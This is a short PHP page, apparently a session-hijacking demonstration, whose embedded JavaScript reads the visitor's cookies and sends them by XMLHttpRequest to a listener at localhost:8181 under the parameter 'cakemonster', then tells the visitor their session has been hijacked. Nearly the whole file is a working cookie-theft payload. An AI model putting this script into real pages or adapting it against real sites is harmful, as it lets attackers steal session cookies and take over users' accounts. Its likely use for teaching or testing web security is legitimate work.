<?php
session_start();
?>
<html>
<head>
  <title></title>
</head>
<body>
  <script type="text/javascript">
  var xmlHttp = null;
  var adr = 'http://localhost:8181/?cakemonster=' + escape(document.cookie);
  xmlHttp = new XMLHttpRequest();
  xmlHttp.open( "GET", adr, false );
  xmlHttp.send( null );
  </script>
  <p>Guess what... your session has been hijacked.</p>
</body>
</html>